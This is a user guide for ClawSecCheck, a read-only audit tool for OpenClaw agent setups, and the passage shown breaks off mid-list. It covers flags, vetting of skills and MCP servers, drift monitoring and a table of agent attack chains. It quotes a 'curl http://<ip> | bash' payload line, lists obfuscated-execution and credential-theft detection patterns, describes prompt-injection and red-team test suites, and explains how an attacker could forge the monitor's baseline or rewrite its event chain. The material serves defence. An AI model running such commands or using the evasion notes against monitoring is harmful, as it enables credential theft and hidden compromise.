# ClawSecCheck — User guide

This is the full user guide: every install path, flag, recipe, and trust
detail. The short version lives in the [README](../README.md).

Everything below is **local and read-only against your OpenClaw setup** —
nothing here ever changes your config, and the scanner itself makes no network
calls. (When you run it through OpenClaw chat, the report text becomes part of
your conversation and is handled by the model provider your agent already uses.)

## Install & run

```bash
openclaw skills install @gl0di/clawseccheck     # from ClawHub
openclaw skills install git:gl0di/clawseccheck  # or straight from GitHub
# then ask your agent: "audit my OpenClaw setup with clawseccheck"
```

Skill page on ClawHub: **<https://clawhub.ai/gl0di/skills/clawseccheck>**.

Or install it as a standalone CLI (zero dependencies):

```bash
pipx install git+https://github.com/gl0di/clawseccheck   # or: pip install .
clawseccheck --home ~/.openclaw                            # then just `clawseccheck`
python -m clawseccheck                                     # also works
```

Or run the bundled script directly (Linux/macOS):

```bash
python3 audit.py                 # human report + shareable card
python3 audit.py --menu          # the Welcome menu (four common modes)
python3 audit.py --functions     # the full capability palette (everything it can do)
python3 audit.py --json          # machine-readable
python3 audit.py --card          # just the badge
python3 audit.py --ascii         # plain output (no unicode icons/box)
python3 audit.py --no-color      # disable ANSI colour (see below)
python3 audit.py --home ~/.openclaw
```

The terminal report is colourised (grade, score-bar, severity icons) **only** when output is
an interactive terminal. Colour is switched off automatically when the output is piped or
redirected, by `--no-color`, or by the [`NO_COLOR`](https://no-color.org) environment variable;
`FORCE_COLOR` forces it on. Saved reports (`--save`) are always written as plain text.

On **Windows** use `python` (or `py`); the script auto-detects consoles that can't render
unicode and falls back to ASCII, or force it with `--ascii`:

```bat
python audit.py
py audit.py --card --ascii
```

Cross-platform: pure Python stdlib, pathlib-based paths, and an ASCII fallback for every
output. The read-only audit runs on Linux, macOS, and Windows (Linux + macOS are covered by
CI). **Local-store hardening is POSIX-only, though:** the "owner-only, symlink-safe"
guarantees for `~/.clawseccheck/` (history/state/reports) rely on POSIX `chmod` and
`O_NOFOLLOW`. On **Windows** both degrade — file modes are not enforced as NTFS ACLs (the
store is not owner-restricted) and the symlink-clobber guard is a no-op — so on Windows treat
`~/.clawseccheck/` as an ordinary user file, not a hardened store. The audit results
themselves are unaffected.

## How you get the report

When you run the skill inside OpenClaw, the agent executes `audit.py`, captures its output,
and shows it to you **right there in the chat** — no terminal, no setup. You see:

1. your **Score / Grade**,
2. **findings grouped by area** (network, privilege, supply chain, secrets, …), most urgent
   first within each — the Lethal Trifecta shows up here too, as a Privilege & Execution
   finding, not a separate headline, and
3. a **shareable card** — grade + score + Lethal Trifecta ratio, safe to post (the findings stay
   private; `--badge` writes the same grade + score as an SVG).

To keep a copy, add `--save report.txt` and ClawSecCheck writes the full report to that file
(written only when you ask). For automation, `--json` gives a machine-readable result.

Chat rendering is best-effort — the host agent relays and re-composes that text over its own
channel. The **canonical, deterministic output is always a saved file**: `--save`, `--html`,
or `--badge grade.svg`. If you need something you can rely on byte-for-byte (or attach as a
real image, in the badge's case), use the saved file, not the chat paste.

## Guided mode

When you run ClawSecCheck inside OpenClaw, the agent walks you through the entire audit
conversationally — you never need to know a flag. After every default run, ClawSecCheck prints a
short **"What you can do next"** block: a prioritised list of the most relevant follow-up steps
for *your* findings, with the exact command to run each one.

The same list is available two other ways:

```bash
python3 audit.py --next          # print the next-steps block only (after running the audit)
python3 audit.py --json          # includes a "next_actions" array in the JSON envelope
```

The recommendations are driven by your actual results — unvetted third-party skills surface
`--vet`; no monitoring detected surfaces `--monitor`; trifecta exposure surfaces the live
injection tests; and so on. Every suggestion is a further **check** — never remediation.

**ClawSecCheck is reports-only: it never fixes, suggests fixes, or changes your config.**
The human report states what is wrong and why; acting on it is yours. For machine consumers,
each finding still carries structured `"fix"`/`"remediation"` data in `--json` and SARIF —
data for your own tooling, not something ClawSecCheck renders or offers.

## Recipes / common prompts

Most people never type a flag — you talk to your agent, it has the skill installed, and it runs
the right command for you. Here are ready-to-say prompts for common goals: what to tell your
agent, what happens, and (for the CLI-minded) the underlying command. Every recipe below is
audit/report only — nothing here ever changes your config.

(This is the human-facing cookbook. For the full agent-facing phrase-to-flag routing table the
skill itself uses, see [`SKILL.md`](../SKILL.md#natural-language-to-tool-quick-map).)

| You say | What happens | Under the hood |
|---|---|---|
| "Audit my setup, what's my grade?" | Runs the full audit, shows Score + Grade (A–F) and findings grouped by area, most urgent first. | `clawseccheck` (no flags) |
| "Is this skill safe to install?" / "Vet this before I install it" | Scans the skill's content for malware patterns, injection directives, and supply-chain risk *before* you enable it — type is autodetected. | `--vet <path>` (or `--vet-skill <path>` / `--vet-plugin <path>` to force an engine) |
| "Is this safe to even download?" | Checks the *source*'s identity (typosquat, known-bad, unpinned ref) with zero network before anything is fetched. | `--vet-source <slug\|url\|pkg>` |
| "Are my MCP servers trustworthy?" | Vets every connected MCP server for supply-chain risk (unpinned installs, plaintext transports, broad OAuth scopes). | `--vet-mcp` |
| "What's the single most important thing to fix?" | Prints a prioritised "what you can do next" list based on your actual findings — still just further checks, never auto-fixes. | `--next` |
| "Fix this for me" | It won't — ClawSecCheck reports problems and risks, never fixes. Each finding states what's wrong and why; `--json`/SARIF carry structured `fix`/`remediation` data for your own tooling, and the [check catalog](CHECKS.md) documents remediation guidance per check. Nothing is ever applied for you. | `clawseccheck` (read the report) / `--json` |
| "Am I vulnerable to prompt injection?" | Runs live self-tests: a benign injection canary, a broader dry-run harness, or both plus red-team payloads together. | `--canary` · `--dryrun` · `--self-test` |
| "What dangerous actions can my agent actually take?" | Emits a self-report template for your agent to fill in with its real tool/verb inventory, then scores the blast radius (EXEC, DESTRUCTIVE, EGRESS, …) once you feed it back. | `--ask` then `--attest <file>` |
| "Watch for changes over time" | Re-audits and alerts on what changed since last time (new skill, config drift, a memory-file edit, a check leaving PASS). **Note:** this is the one opt-in exception to read-only — it writes a small local snapshot (`~/.clawseccheck/state.json`) so it has something to diff against next run. | `--monitor` |
| "Am I improving? How do I rank?" | Shows your score history over time, or how your current score compares to an offline reference profile — no network either way. | `--trend` · `--percentile` |
| "Share my grade without leaking my findings" | Produces just the grade + score (+ Lethal Trifecta ratio) — safe to post; your actual findings never appear. | `--card` (prints it) · `--badge grade.svg` (writes an SVG) |
| "What's actually installed — skills, MCP servers, versions?" | Exports a local bill-of-materials (skills, MCP servers, hashes, declared/unpinned dependencies) as JSON. | `--sbom` |
| "I think I've been compromised — help me preserve evidence" | Bundles a findings snapshot, skill/MCP hashes, trajectory-log hashes, and a credential rotation list into one local JSON file — a preservation aid, never rotates or deletes anything itself. | `--incident` |
| "Did a suspicious skill's instruction actually run?" | Post-hoc correlation: checks whether the credential/exfil/secret-path indicators an installed skill names show up in real `tool.call` arguments in your OpenClaw trajectory sidecars — "acted on" vs "present but not acted on". Reads args in memory only; never echoes them. | `--analyze-trajectory` |
| "What did my agent actually DO, not just what it could do?" | Reconstructs observed tool-call sequences from your OpenClaw trajectory sidecars and flags a proven-by-log ingress→sensitive→egress verb order, or a repeated-failure-then-success pattern on a sensitive-data call. Also reads OpenClaw's OWN runtime `audit_events` trail (a separate, metadata-only record: `tool_name` alone, no argv/command/path/host) for a runtime tool-block, an evasive/malformed tool name, or a session your trajectory sidecar no longer has (it was disabled or rotated out while `audit_events` still retained it). Metadata-only throughout — verb identity and sequencing, never call/return payloads. WARN-only, never scored. | `--behavioral` |
| "Gate my CI on this" | Machine-readable output plus a non-zero exit when the score drops below a bar or an unsuppressed FAIL exists — wire straight into a pipeline. | `--json` · `--sarif results.sarif` · `--fail-under 70` · `--exit-code` |

## What it checks

The complete, always-current reference is the generated
**[check catalog](CHECKS.md)** — verdict semantics, remediation, and compound
risk chains for every check — plus the **[threat coverage matrix](THREAT_COVERAGE.md)**.
The narrative version, in one paragraph per theme:

- **Lethal Trifecta** (untrusted input × sensitive data × outbound actions — keep ≤2 of 3),
  gateway exposure & channel auth, plaintext secrets, least privilege, execution sandbox,
  plugin/skill supply-chain integrity, bootstrap-file injection surface, memory poisoning,
  human approval, secret-leak/redaction, TLS, and local-first/model hygiene.
- **Installed-skill / plugin vetting** scans the *content* of skills you downloaded
  (not made yourself) for the ClawHavoc malware class, including base64-hidden payloads.
  A static **Python AST** pass (stdlib `ast`, parse-only — never executed) catches what
  obfuscation regexes miss — `exec(base64.b64decode(...))`, `getattr(os,"sys"+"tem")(...)`,
  `__import__("os").system(...)` — plus prompt-injection / hide-from-user directives embedded
  in a third-party skill's prose, and a **taint trace** that flags a credential **file's**
  contents (`~/.ssh/id_*`, `.aws/credentials`, keychain, wallet, …) flowing into a network
  sink ("read a secret file → send it out"). Sources are credential files only, not env vars,
  so the legit "read `OPENAI_API_KEY`, send as auth header" pattern is never flagged.
  (AST is Python-only; JS/shell stay on the regex engine.)
- **Egress & trust boundaries:** where the agent can reach out (channels, external skills,
  tools), MCP server trust, untrusted-context exposure, sender identity strength,
  control-plane reachability, browser/SSRF exposure, and OpenClaw's documented
  `dangerously*` break-glass overrides.
- **Agent behavior & autonomy:** write-protection of identity/memory files, tool-output
  trust boundaries, self-modification risk, approval-bypass directives, subagent
  delegation, autonomy/heartbeat steering, and session-visibility leaks.
- **The attestation layer** closes what a config file cannot show: `--ask` emits a template
  your agent fills with its *real* tool/verb inventory, `--attest` feeds it back, and the
  engine classifies the held verbs by blast radius (`EXEC`, `MAILBOX_CONFIG`, `DESTRUCTIVE`,
  `EGRESS`, `REVERSIBLE`) and cross-checks the self-report against the config. Attested
  findings are marked `ATTESTED` — advisory, never overriding a config fact. The same
  self-report lets per-agent privilege separation and cross-agent trifecta reassembly
  (confused-deputy chains) be assessed; without it those checks honestly report `UNKNOWN`.
- **Data at rest & host posture:** group/world-readable memory/log directories,
  at-rest write protection of bootstrap files and the OpenClaw install tree, plus a
  read-only detection of host defensive monitors (paths, `PATH`, the text of a few known
  firewall config files, and on Windows a handful of read-only registry queries) — network
  IDS, audit logging, file-integrity monitoring, EDR, host firewall. LOW severity, never
  FAIL: a missing monitor is at most a WARN, and anything not determinable read-only is
  `UNKNOWN`.
- **Incident readiness:** presence and tamper-resistance of OpenClaw's per-session
  trajectory sidecars — the on-disk record a post-incident investigation depends on.

**Mapped to OWASP.** Each check is tagged with its **OWASP Top 10 for LLM Applications (2025)**
category (surfaced per finding in `--json` as `"owasp": [...]`), and the checks are mapped to the
agent-specific **OWASP Agentic (ASI)** threat classes — tool misuse, multi-agent identity/privilege
abuse, insecure inter-agent communication, cascading blast-radius — that an app-code reviewer never
sees. Full matrix in [`THREAT_COVERAGE.md`](THREAT_COVERAGE.md).

## Why another audit tool?

The built-in `openclaw security audit` and tools like Trent/ClawSec are good — but:

- The native audit **does not inspect the content of your bootstrap files**
  (`SOUL.md`, `AGENTS.md`, `TOOLS.md`): they're injected into the system prompt as *trusted
  context* with no validation. ClawSecCheck **does** check them for prompt-injection-prone
  directives.
- ClawSecCheck's scanning engine is **fully local** — no API key, nothing transmitted (Trent uploads your config;
  the native one is CLI-only).
- It leads with a **shareable Score + Grade + Lethal Trifecta ratio** you can post to the
  community — without ever exposing your actual findings.

## Built-in native audit, included for you

Non-technical users will never open a terminal to run OpenClaw's own
`openclaw security audit`. So ClawSecCheck runs it **for you** (read-only) and folds its
findings into the same plain-language report — one button shows both ClawSecCheck's checks
*and* the platform's own audit. Native findings are shown but are **not** mixed into the
ClawSecCheck score (kept deterministic). Disable with `--no-native`.

## Trust & provenance

ClawSecCheck is **open source and zero-dependency (Python stdlib only)**. Its own checks are
**read-only and offline** — they make **no network calls** and never touch your OpenClaw config.
**The scanner itself makes no network calls.** Full read scope:

- `~/.openclaw/openclaw.json` and workspace bootstrap files (`SOUL.md`, `AGENTS.md`, etc.)
- text of installed skills/plugins (Python files are AST-parsed, never executed)
- `~/.openclaw/logs/config-audit.jsonl` and `config-health.json` (config-log checks)
- `~/.openclaw/agents/.../sessions/*.jsonl` (approval-policy posture)
- host OS recon for IDS/FIM/EDR/firewall: existence of their config files and binaries on
  `PATH`, the text of a few known firewall config files (`/etc/ufw/ufw.conf`,
  `/etc/nftables.conf`, macOS `com.apple.alf.plist` — read for on/off and default outbound
  policy), and on Windows a handful of read-only registry queries for the same signals
- credential-store path-existence inventory: whether `.env`, SSH key dirs, keychain/keyring
  directories, and browser cookie stores **exist** near the agent home — contents never read.

The only thing it writes by default is a one-line
entry to a **private, owner-only** local score history (`~/.clawseccheck/history.jsonl`) so you can
track your grade over time — opt out with `--no-history`. Everything else is written only when you
ask: a report file (`--save`), the `--monitor` snapshot and change journal
(`~/.clawseccheck/state.json`, `events.jsonl`), a badge (`--badge`), HTML/SARIF (`--html`/`--sarif`),
a log (`--log`), and a small freshness ledger (`~/.clawseccheck/coverage.json`) recording when you
last ran an active self-test (`--canary`/`--redteam`/`--dryrun`/`--self-test`/`--vet-mcp`).

The **only** external command it can run is your own, fixed and read-only:

```text
openclaw security audit --json
```

No shell, read-only mode only, with a timeout; skip it entirely with `--no-native`. The entire
source is in [`clawseccheck/`](../clawseccheck/) — read it before you trust it. Amid the ClawHavoc
malicious-skill wave, an audit skill should prove its own safety; this one does.

## Important — trust no one (including this skill)

OpenClaw skills are **not sandboxed**: an installed skill runs with your agent's full
permissions. The ClawHavoc campaign poisoned ClawHub with **hundreds of malicious skills**
that steal credentials and crypto wallets — a single line of markdown can hide a
`curl http://<ip> | bash`.

So, before you download, install, or use **any** skill (this one included):

1. **Read the source** — it's plain text. If you can't see what it does, don't run it.
2. **Have your agent analyse it for you** — ask OpenClaw to review the skill's `SKILL.md`
   and scripts for shell-exec, credential access, paste-host uploads, and obfuscated
   (base64) payloads *before* enabling it. ClawSecCheck does this with `--vet <skill>`.
3. **Pin a known release**, prefer signed / VirusTotal-clean skills, and rotate any secret a
   skill could have reached if you ever suspect it.

ClawSecCheck practises this: it is open source, zero-dependency, read-only, and its
installed-skill check does exactly this vetting on the skills you've *already* installed.
Trust is earned by being readable — so read it.

**Verifying ClawSecCheck itself hasn't been tampered with.** `clawseccheck --verify-self`
prints a SHA-256 digest of the engine's own source — but a digest computed *from inside* a
possibly-modified copy is only a tripwire, not proof (a tampered `integrity.py` could print
anything). The trusted reference lives out-of-band: every GitHub Release publishes a
`SHA256SUMS.txt` (same digest format `--verify-self` prints) signed with
[cosign](https://github.com/sigstore/cosign) in keyless mode via the release workflow's own
GitHub Actions OIDC identity — no private key for anyone to leak or steal. Verify it before
trusting the comparison:

```bash
# Get the release assets (adjust the version):
curl -LO https://github.com/gl0di/clawseccheck/releases/download/vX.Y.Z/SHA256SUMS.txt
curl -LO https://github.com/gl0di/clawseccheck/releases/download/vX.Y.Z/SHA256SUMS.txt.bundle

cosign verify-blob \
  --bundle SHA256SUMS.txt.bundle \
  --certificate-identity-regexp "^https://github.com/gl0di/clawseccheck/" \
  --certificate-oidc-issuer https://token.actions.githubusercontent.com \
  SHA256SUMS.txt
```

A passing `cosign verify-blob` proves `SHA256SUMS.txt` was produced by *this repo's* release
workflow and hasn't been altered since — not that the CI pipeline itself is uncompromisable.
This closes the loop against opportunistic tampering of a downloaded copy; it is not a
guarantee against a targeted adversary who also compromises the CI pipeline.

**The same principle applies to the host itself.** If a machine is already compromised,
anything running on it at your own privilege level — ClawSecCheck included — can in
principle be tampered with so it hides the compromise; `--verify-self` catches lazy
tampering, not a targeted adversary who patches the verifier too. The honest fix is to
scan the suspect config from a separate, clean machine via `--home`, not to trust a
self-check running on the box in question. See
[What if the host is already compromised?](FAQ.md#what-if-the-host-is-already-compromised)
in the FAQ for the full protocol.

## Updating

OpenClaw remembers where a skill came from, so users get your new versions by updating:

```bash
openclaw skills update clawseccheck   # pull the latest from its source (Git/ClawHub)
clawhub update --all                  # update every installed skill
```

(Or re-run the install command.) An auto-updater skill / `update.auto.enabled` in
`~/.openclaw/openclaw.json` can update on a schedule. Because skills run with the agent's full
permissions, a malicious *update* is a real supply-chain risk — so each release here is tagged
and the source is public to read **before** updating. Prefer reviewing/pinning a tag over blind
auto-update for anything security-sensitive.

> **First call after an update looks empty?** Some OpenClaw versions reload a freshly-updated
> skill lazily, so the *first* invocation right after an update can return nothing; just run it
> again. This is an OpenClaw skill-reload timing artifact on the runtime side, not the audit —
> confirm the engine is live with `clawseccheck --verify-self`.

**Staleness reminder (offline).** A stale security scanner is itself a risk, so the default report
may print a one-line "your build may be out of date" notice. It is **100% offline** — it reads only
the local clock against the baked-in build date, plus an optional local hint file
`~/.clawseccheck/latest.json` that your distribution layer or agent may write. ClawSecCheck **never
checks for its own updates over the network** (that would break its zero-network promise and it
would have to flag itself). The actual "is there a newer version?" lookup belongs to your package
tooling or your agent — see SKILL.md "Keeping ClawSecCheck current". Silence the notice with
`--no-update-notice` or `CLAWSECCHECK_NO_UPDATE_NOTICE=1`; after any update, verify the engine with
`--verify-self`.

## Threat monitoring

Two complementary things:

**Do you have monitoring at all?** ClawSecCheck checks whether you have threat
monitoring/detection set up — an agent with none won't alert you if it's compromised. It looks
for a monitoring skill/plugin (ClawSec, `openclaw-security-monitor`, …) or monitoring/alerts
config; if none is found it warns you and tells you how to add one.

**`--monitor` — Agent Watch.** One way to *get* monitoring: re-audit on a schedule and alert,
**by severity**, on what **changed** — a new or modified installed skill, `SOUL.md` drift, **any
change to a file under `<workspace>/memory/`**, a dropped score, **a check leaving PASS (for FAIL,
WARN or UNKNOWN)**, **a newly connected MCP server, a new channel, the gateway becoming
network-exposed, or a host monitor disappearing**. Each run appends the changes to a private local
journal (`~/.clawseccheck/events.jsonl`, owner-only, never uploaded); view the timeline with
`--watch-log`.

A regression alert carries the **catalog severity of the check that regressed**, so a CRITICAL
check going FAIL is reported as CRITICAL — matching how the full audit renders the same finding —
rather than a flat HIGH for every check.

Two things worth knowing about how the comparison behaves:

- **Drift detection is upgrade-safe for the dimensions a snapshot can predate.** The MCP,
  rug-pull, channel, gateway, host and persistent-memory comparisons each require their key in
  *both* the stored and the current snapshot, so an older snapshot never produces spurious "new
  connection", "new memory file", or rug-pull alerts after an upgrade — such a dimension is
  skipped for exactly one run, then compares normally.
- **An unchanged grade is not evidence that nothing got worse.** The displayed score is capped by
  the most severe open FAIL (a CRITICAL FAIL pins it at 49), so on a config that already holds one
  it cannot fall further. `--monitor` therefore also tracks the uncapped pass-rate underneath and
  reports degradation even while the grade sits still.

```bash
python3 audit.py --monitor                 # first run = baseline, then alerts on changes
python3 audit.py --monitor --state ~/.clawseccheck/state.json
```

Schedule it via OpenClaw's heartbeat or cron; when an alert fires, have your agent message you.
It stores one small snapshot at `~/.clawseccheck/state.json`. (Scheduled re-audit + drift
detection — not a real-time runtime IDS; that heavier model is intentionally out of scope.)

Verify the event journal's own tamper-evident chain by name (not the score-history one) with:

```bash
clawseccheck --verify-events                       # checks the default ~/.clawseccheck/events.jsonl
clawseccheck --verify-events --events PATH         # or a specific journal
```

### Known limits of `--monitor` (read before relying on it)

These are inherent boundaries of a **local, file-based, scheduled** drift detector — not bugs to
be fixed, and not a substitute for host-level file-integrity monitoring or a real-time runtime
IDS. Disclosed here so they are a known trade-off, not a surprise:

- **`state.json` is unauthenticated.** Unlike `history.jsonl`/`events.jsonl` (hash-chained — see
  "Audit trail" in [SECURITY_MODEL.md](../SECURITY_MODEL.md)), the drift baseline
  (`~/.clawseccheck/state.json`) carries no chain and no signature. Anyone with write access to
  that file (i.e. anyone who already runs as you) can forge a baseline, and the next `--monitor`
  run re-baselines against whatever it finds there, silently — a compromise that predates a
  forged baseline is never reported as drift.
- **The events chain only catches naive edits.** A knowledgeable attacker who already has write
  access can recompute the whole chain forward after tampering, truncate the tail, or delete the
  file outright — all three verify "clean". See "What the chain does and does not defend" in
  [SECURITY_MODEL.md](../SECURITY_MODEL.md).
- **Concurrency locking is POSIX-only.** `journal_lock` (the append-time serialization that keeps
  two racing writers from both reading the same "last" hash) takes a `flock`/`fcntl` sidecar
  lock; without `fcntl` — most notably **Windows**, which this project does advertise support for
  (see the Windows caveat above) — it degrades to a no-op. Two writers racing the journal at the
  same instant can then genuinely interleave, and `--verify-history`/`--verify-events` reports
  `BROKEN` — a **false accusation of tampering** caused by lost serialization, not an attacker.
- **`--home` is not hermetic.** An absolute `agents.defaults.workspace` (or a per-agent
  `agents.list[].workspace` override) is followed even when it resolves OUTSIDE the `--home`
  directory you pointed ClawSecCheck at — by design (OpenClaw's own loader has no home-check, so
  rejecting it would be a false-negative skip, not a safety win). A test/staging `--home` can
  therefore still read your real workspace if the config says so.
- **`--monitor` writes THREE files, and `--state`/`--events` alone do not isolate a run.**
  `--history` defaults independently to `~/.clawseccheck/history.jsonl` even when `--state`/
  `--events` are redirected elsewhere — redirect all three, or a sandboxed/test/CI run still
  appends a real-looking row to your live history. Each history row's `home` field is currently
  always `null` (no call site populates it with the audited path), so a foreign-home row is not
  distinguishable from a genuine one after the fact.
- Also worth knowing: `--state`/`--events`/`--history`'s containing directory is created `0700`
  (owner-only) the first time any of them is written (`safeio.secure_dir`) — a silent side effect
  outside the target file itself, with no message printed, from a tool that otherwise promises
  read-only.

**A cron recipe.** `--monitor` has no exit-code channel by design (severity is advisory, not
pass/fail — a MEDIUM alert and a CRITICAL one both `return 0`), so wire your own gate off
`events.jsonl` instead of the exit code:

```bash
#!/bin/sh
# rc=1 only when a NEW CRITICAL event was journaled since the last time this ran.
EVENTS=~/.clawseccheck/events.jsonl
MARK=~/.clawseccheck/.cron-last-count
clawseccheck --monitor >/dev/null 2>&1
prev=$(cat "$MARK" 2>/dev/null || echo 0)
curr=$(wc -l < "$EVENTS" 2>/dev/null || echo 0)
echo "$curr" > "$MARK"
[ "$curr" -gt "$prev" ] || exit 0
tail -n "+$((prev + 1))" "$EVENTS" | grep -q '"level": "CRITICAL"' && exit 1
exit 0
```

## Highest-risk paths

Beyond individual checks, ClawSecCheck runs a **risk engine** that looks for dangerous
*combinations* — capability chains where two or more co-occurring properties make a
compromise catastrophic or trivial to execute.

The highest-risk chains it detects now span **RISK-01 through RISK-18**:

| ID | Severity | Chain |
|----|----------|-------|
| RISK-01 | CRITICAL | Untrusted sender (open DM/group) → exec/write/elevated tool → host/filesystem |
| RISK-02 | HIGH | Untrusted input → sensitive data reachable → outbound/exec (Lethal Trifecta) |
| RISK-03 | HIGH | Untrusted ingress + no execution sandbox → exec/write directly on host |
| RISK-04 | HIGH | Mutable agent identity (name-matching) → elevated/exec tools → privilege escalation |
| RISK-05 | HIGH | Browser SSRF to private network → secrets/credentials → exfiltration |
| RISK-06 | CRITICAL | Open/untrusted surface → control-plane endpoint → full agent takeover |
| RISK-07 | HIGH | Exec/write tool (no approval gate) → writable bootstrap/identity files → persistent compromise |
| RISK-08 | MEDIUM | Multi-user channel → shared session (`dmScope="main"`) → cross-user data leak |
| RISK-09 | CRITICAL | Malicious installed skill → reachable secrets/data → outbound egress → exfiltration |
| RISK-10 | MEDIUM | Untrusted input → agent can exec/write on host → no host detection (IDS/audit/FIM/EDR) → a breach would be invisible |
| RISK-11 | HIGH | Cross-agent trifecta reassembly (confused deputy): untrusted-input agent → drives a sensitive-data agent → drives an outbound agent across non-wall delegation edges |
| RISK-12 | HIGH | Untrusted input + broad/unscoped write capability → filesystem tamper/persistence |
| RISK-13 | HIGH | Markdown-image exfil + writable memory/bootstrap = persistence / exfil |
| RISK-14 | HIGH | Wildcard-elevated sender + heartbeat → self-escalating autonomy loop |
| RISK-15 | HIGH | Untrusted context + browser SSRF to private network → metadata/credential exfiltration |
| RISK-16 | HIGH | RW workspace + host bind + plaintext gateway credential path → control-plane takeover |
| RISK-17 | HIGH | Conditional sleeper trigger + scheduled execution = delayed RCE |
| RISK-18 | HIGH | Untrusted context + cron + heartbeat = persistent autonomous foothold |

Each chain fires **only when every link has positive evidence** — no chain is invented from
absent or UNKNOWN data, so findings are evidence-gated, which keeps false positives low —
but this is a heuristic audit, not a guarantee; manual review is still required. The risk
engine does not change the deterministic A–F score; it surfaces separately so you can see
the worst-case paths at a glance without score inflation.

```bash
python3 audit.py --risk-paths       # print the highest-risk chains section only
python3 audit.py --json             # includes a "risk_paths" array in the JSON envelope
```

The `--risk-paths` output is also appended to the default report when any chain fires.

## CI / automation

```bash
python3 audit.py --sarif results.sarif      # write SARIF 2.1.0 locally (for GitHub Code Scanning upload step)
python3 audit.py --fail-under 70            # exit 1 if score < 70 (use in CI pipelines)
python3 audit.py --exit-code                # exit 1 if any unsuppressed FAIL finding
```

The SARIF file is written to the path you choose — ClawSecCheck never uploads it anywhere.
`--fail-under` and `--exit-code` do not change the default exit code (0) when omitted,
preserving backward compatibility.

## More tools

**Quick CLI reference** (every flag is local & read-only against your config):

| Need | Command |
|---|---|
| Human report | `clawseccheck` |
| JSON / SARIF output | `clawseccheck --json` · `clawseccheck --sarif results.sarif` |
| Highest-risk chains | `clawseccheck --risk-paths` |
| Vet anything before install (type autodetected) | `clawseccheck --vet ./target` |
| Vet a skill / a plugin explicitly | `clawseccheck --vet-skill ./skill` · `clawseccheck --vet-plugin ./plugin` |
| Vet connected MCP servers | `clawseccheck --vet-mcp` |
| Reputation gate before download | `clawseccheck --vet-source clawhub:some-skill` |
| Active injection self-test | `clawseccheck --canary` · `clawseccheck --redteam` · `clawseccheck --dryrun` |
| All-in-one (audit + self-test + vet-mcp) | `clawseccheck --full` · add `--quiet` to collapse the appended sections to one-line summaries (lighter for CI logs) |
| Monitor drift / view timeline | `clawseccheck --monitor` · `clawseccheck --watch-log` |
| Attestation template / feed it back | `clawseccheck --ask` · `clawseccheck --attest attest.json` |
| Shareable card / SVG badge | `clawseccheck --card` · `clawseccheck --badge badge.svg` |
| Trend & percentile | `clawseccheck --trend` · `clawseccheck --percentile` |
| Accept a finding (show suppressed) | edit `.clawseccheckignore` · `clawseccheck --show-suppressed` |
| Skip native audit / host posture | `clawseccheck --no-native` · `clawseccheck --no-host` |
| Disable local history / age notice | `clawseccheck --no-history` · `clawseccheck --no-update-notice` |
| CI gate | `clawseccheck --fail-under 70` · `clawseccheck --exit-code` |
| Verify the engine itself | `clawseccheck --verify-self` |

```bash
python3 audit.py --next                    # print the "What you can do next" guidance block only
python3 audit.py --vet ./some-target       # vet a skill / plugin / MCP spec BEFORE installing it (type autodetected)
python3 audit.py --vet-skill ./some-skill  # force the skill engine (dir or SKILL.md)
python3 audit.py --vet-plugin ./some-plugin # force the plugin engine (root dir or openclaw.plugin.json)
python3 audit.py --vet ./some-skill --json # same, machine-readable risk dossier (grade + axes + findings); --sarif PATH for CI
python3 audit.py --vet-mcp                 # vet connected MCP servers for supply-chain risk BEFORE trusting them
python3 audit.py --vet-source npm:some-pkg # reputation gate on a slug/URL/package spec BEFORE anything is fetched
python3 audit.py --canary                   # active prompt-injection self-test (battle-tested)
python3 audit.py --redteam                   # a multi-scenario adversarial payload suite (incl. tool-poisoning, MCP-response injection, memory-poisoning, multi-agent, approval-bypass, dirty-to-exfil)
python3 audit.py --dryrun                     # runtime behavioral test (fake secret + fake tools; sources: email, web, MCP response, memory, subagent)
python3 audit.py --badge badge.svg          # write a shareable SVG grade badge
python3 audit.py --html report.html         # standalone HTML report (private — owner view)
python3 audit.py --verify-self               # SHA-256 of ClawSecCheck's own source (anti-tamper)
python3 audit.py --trend                     # print local score trend (stored in ~/.clawseccheck/history.jsonl)
python3 audit.py --percentile                # show where your score sits vs. an offline reference profile
python3 audit.py --history ~/.clawseccheck/history.jsonl  # custom history file path (default shown)
python3 audit.py --verbose                   # INFO-level log to stderr (secrets redacted)
python3 audit.py --debug                     # DEBUG-level log to stderr (secrets redacted)
python3 audit.py --log audit.log            # also write log to a local file
```

- **`--next`** prints the "What you can do next" guidance block on its own — runs the audit
  first, then shows only the prioritised next-steps list. Same content as the block appended to
  the default report; useful if you want to re-check recommendations without re-reading the full
  report.
- **`--vet TARGET`** vets *anything* before you install it: the artifact type is autodetected by
  content (a plugin manifest → plugin engine; an MCP server-spec JSON or configured server name →
  MCP engine; otherwise the skill engine) and printed to stderr as `detected type: …`.
  `--vet-skill` / `--vet-plugin` / `--vet-mcp` force a specific engine. For a skill it runs the
  full skill-content security scan —
  the malware scan **plus** the content-security ring (capability-intent mismatch, cross-agent
  snooping, silent-instruction / jailbreak / forged-provenance directives) the full audit runs on
  installed skills (point it at a
  downloaded folder or `SKILL.md`; for a URL, clone it first, then vet the local copy). The output
  is a **risk dossier** — one A–F grade over five axes: **danger** (how dangerous to use), **build**
  (how it's built), **behavior** (how it thinks / behaves), **persistence** (what it stages for
  later), and **connections** (whom it reaches out to) — with an overall NO KNOWN ISSUE / SUSPICIOUS /
  DANGEROUS verdict. Add `--json` for the machine-readable dossier (grade + per-axis breakdown +
  findings), or `--sarif PATH` to drop a SARIF file for CI / code scanning; exit code is `1` on
  SUSPICIOUS/DANGEROUS so `--vet … || fail` gates an install pipeline.
- **`--vet-plugin PATH`** vets an OpenClaw plugin (root dir, `openclaw.plugin.json`, or an
  installed wrapper project) *before* you install it: manifest sanity, npm lifecycle scripts,
  floating dependency versions, native-executable stowaways, and skills entries escaping the
  plugin root — then dispatches bundled skills to the skill engine (they auto-load via
  `~/.openclaw/plugin-skills/`) and embedded MCP specs to the MCP engine. Plugin runtime code is
  JS/TS and is disclosed as outside this vet's static depth — review entry files before trusting.
- **`--vet-source SLUG|URL|PKG`** is the pre-download reputation gate: it judges a source's
  *identity* — `clawhub:<slug>`, `npm:<pkg>`, `pypi:<pkg>`, `git:host/owner/repo[@ref]`, or a
  URL — with zero network and nothing fetched. Exact match in the bundled known-compromised
  catalog → KNOWN-BAD (do not fetch, exit 1); typosquat of a well-known name / raw paste or
  bare-IP host / plaintext http / unpinned git ref → SUSPICIOUS (fetch only into an isolated
  quarantine, exit 1); otherwise the honest answer is *no known-bad record* (exit 0) — an
  identity check can never prove unseen code safe, so proceed via quarantine and run `--vet`
  on the fetched copy before installing.
- **`--vet-mcp`** vets every MCP server listed under `mcp.servers.*` for supply-chain risk
